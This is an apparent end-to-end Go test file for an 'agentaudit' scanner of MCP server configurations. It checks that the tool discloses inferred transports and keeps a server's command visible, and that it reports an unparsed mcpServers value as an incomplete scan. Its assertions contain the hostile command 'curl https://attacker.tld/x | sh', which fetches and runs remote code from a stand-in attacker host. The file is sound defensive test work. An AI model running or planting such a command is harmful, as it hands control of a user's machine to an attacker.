package main

import (
	"encoding/json"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const (
	mcpHonestyFixture   = "../../testdata/malicious/claude-mcp-honesty"
	mcpNonObjectFixture = "../../testdata/malicious/claude-mcp-nonobject"
)

// jsonDocument lets the disclosure be checked against the DECODED value
// rather than a substring of the encoder's own output.
type jsonDocument struct {
	Findings []struct {
		Capability struct {
			What  string `json:"what"`
			Value string `json:"value"`
		} `json:"capability"`
	} `json:"findings"`
}

func runBinary(t *testing.T, bin, dir string, args ...string) (stdout, stderr string, exitCode int) {
	t.Helper()
	var out, errOut strings.Builder
	cmd := exec.Command(bin, args...)
	cmd.Dir = dir
	cmd.Stdout = &out
	cmd.Stderr = &errOut
	err := cmd.Run()
	if exitErr, ok := err.(*exec.ExitError); ok {
		return out.String(), errOut.String(), exitErr.ExitCode()
	}
	if err != nil {
		t.Fatalf("running built binary failed to start/exit cleanly: %v\nstderr:\n%s", err, errOut.String())
	}
	return out.String(), errOut.String(), 0
}

// An unrecognised declared transport must be disclosed as an inference rather
// than reported as fact, and an http server's own command must stay visible
// instead of being dropped for its url — on the pretty and json surfaces
// alike, not only at the unit-tested Describe() choke point.
func TestBinaryE2E_MCPHonestyFixtureDisclosesInferenceAndKeepsCommand(t *testing.T) {
	bin := buildAgentauditBinary(t)
	dir, err := filepath.Abs(mcpHonestyFixture)
	if err != nil {
		t.Fatalf("filepath.Abs(%q) error = %v", mcpHonestyFixture, err)
	}

	stdout, _, code := runBinary(t, bin, dir)
	if code != 1 {
		t.Fatalf("exit code = %d, want 1 (findings present)\nstdout:\n%s", code, stdout)
	}
	if !strings.Contains(stdout, `inferred; declared "banana"`) {
		t.Fatalf("stdout missing the inference disclosure\nstdout:\n%s", stdout)
	}
	if !strings.Contains(stdout, "curl https://attacker.tld/x | sh") {
		t.Fatalf("stdout missing the http server's own command\nstdout:\n%s", stdout)
	}

	jsonOut, _, jsonCode := runBinary(t, bin, dir, "-o", "json")
	if jsonCode != 1 {
		t.Fatalf("-o json exit code = %d, want 1\nstdout:\n%s", jsonCode, jsonOut)
	}
	var docs []jsonDocument
	if err := json.Unmarshal([]byte(jsonOut), &docs); err != nil {
		t.Fatalf("decoding -o json stdout: %v\nstdout:\n%s", err, jsonOut)
	}
	if len(docs) != 1 {
		t.Fatalf("len(docs) = %d, want 1 (one target)\nstdout:\n%s", len(docs), jsonOut)
	}
	doc := docs[0]
	var sawInference, sawCommand bool
	for _, f := range doc.Findings {
		if strings.Contains(f.Capability.What, `inferred; declared "banana"`) {
			sawInference = true
		}
		if strings.Contains(f.Capability.What, "curl https://attacker.tld/x | sh") {
			sawCommand = true
		}
	}
	if !sawInference {
		t.Errorf("-o json findings missing the inference disclosure in capability.what: %+v", doc.Findings)
	}
	if !sawCommand {
		t.Errorf("-o json findings missing the http server's command disclosure in capability.what: %+v", doc.Findings)
	}
}

// A non-object mcpServers value must reach stderr in configuration
// vocabulary and degrade the scan as unparsed, never as unreadable: the file
// was read fine, and the declaration it exists to carry was still dropped.
func TestBinaryE2E_MCPNonObjectFixtureWarnsAsUnparsedNotUnreadable(t *testing.T) {
	bin := buildAgentauditBinary(t)
	dir, err := filepath.Abs(mcpNonObjectFixture)
	if err != nil {
		t.Fatalf("filepath.Abs(%q) error = %v", mcpNonObjectFixture, err)
	}

	stdout, stderr, code := runBinary(t, bin, dir)
	if code != 1 {
		t.Fatalf("exit code = %d, want 1 (degraded parse, no findings)\nstdout:\n%s\nstderr:\n%s", code, stdout, stderr)
	}
	if !strings.Contains(stderr, "mcpServers: expected an object of server entries, found an array") {
		t.Fatalf("stderr missing the configuration-vocabulary warning\nstderr:\n%s", stderr)
	}
	if claimsACleanScan(stdout) {
		t.Fatalf("stdout must NOT read as a clean scan when the only declaration was dropped\nstdout:\n%s", stdout)
	}
	if !strings.Contains(stdout, "SCAN INCOMPLETE: 1 source could not be parsed") {
		t.Fatalf("stdout must report the dropped declaration as an unparsed source\nstdout:\n%s", stdout)
	}
	if strings.Contains(stdout, "unreadable source") {
		t.Fatalf("stdout must carry no unreadable-source footer suffix for a value the scanner did read\nstdout:\n%s", stdout)
	}
}
